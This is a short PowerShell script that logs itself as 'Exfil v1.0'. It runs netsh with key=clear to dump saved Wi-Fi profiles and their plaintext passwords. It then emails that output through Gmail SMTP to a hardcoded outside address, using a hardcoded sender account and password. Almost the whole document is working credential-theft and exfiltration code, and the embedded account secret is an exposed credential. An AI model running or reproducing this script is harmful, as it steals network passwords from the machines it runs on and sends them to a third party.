

Function Send-Notification
{
    $email = "radicaltronic@gmail.com"
    $recipients = "guillaumeplante.qc@gmail.com"
    $pass = "SecretTEst123"

    $smtpServer = "smtp.gmail.com"

    $ip_val = Get-NetIPAddress | Sort-Object -Property InterfaceIndex | Format-Table
    $host_val = $env:computername | Select-Object


    Get-Date -UFormat “%A %B/%d/%Y %T %Z”
    $Time_val = Get-Date
    $Time_val.ToUniversalTime()


    $msg = new-object Net.Mail.MailMessage
    $smtp = new-object Net.Mail.SmtpClient($smtpServer)
    $smtp.EnableSsl = $true
    $msg.From = "$email" 
    $msg.To.Add("$recipients")
    #$msg.BodyEncoding = [system.Text.Encoding]::Unicode
    #$msg.SubjectEncoding = [system.Text.Encoding]::Unicode
    $msg.IsBodyHTML = $true 
    $msg.Subject = "Automatic notification ($host_val)"


    $msg.Body = $env:MESSAGEBODY

    $SMTP.Credentials = New-Object System.Net.NetworkCredential("$email", "$pass");
    $smtp.Send($msg)  
}



function Log($msg)
{
    Write-Host "[LOG] " -f DarkYellow -NoNewLine
    Write-Host "$msg" -f Red
}

Log "Exfil v1.0"
$wifi_network_name=""
$NetProfiles=(netsh wlan show profiles)
$NetProfiles | Select-String "\:(.+)$" | %{$wifi_network_name=$_.Matches.Groups[1].Value.Trim(); $_} 


if($wifi_network_name -ne "")
{
    "Wifi network name: $wifi_network_name"
    $extended_info=%{(netsh wlan show profile name="$wifi_network_name" key=clear)} 
    %{(netsh wlan show profile name="$wifi_network_name" key=clear)} 

}else{
    "Could not detect Wifi network name"
}


    $EmailMessageBody = "NETWORK INFO: $NetProfiles $extended_info"

    Set-Item -Path Env:MESSAGEBODY -Value $EmailMessageBody
    $env:MESSAGEBODY = $EmailMessageBody

    Send-Notification